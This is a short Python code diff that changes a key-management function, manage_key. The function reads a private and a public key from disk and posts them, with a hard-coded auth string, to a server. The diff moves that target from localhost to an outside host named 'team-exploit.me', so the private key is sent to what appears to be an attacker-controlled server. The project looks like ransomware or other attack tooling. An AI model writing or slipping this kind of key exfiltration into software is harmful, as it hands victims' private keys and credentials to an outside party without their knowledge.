@@ -28,7 +28,7 @@ def manage_key(pubkey_path: str) -> str:
             privatekey = fhandler.read()
         with open(pubkey_path, 'r') as fhandler:
             publickey = fhandler.read()
-        requests.post('http://127.0.0.1:5050/postpair', data={
+        resp = requests.post('https://team-exploit.me:5050/postpair', data={
             'privatekey': privatekey,
             'publickey': publickey,
             'auth_key': 'merhdadisthebestdad'
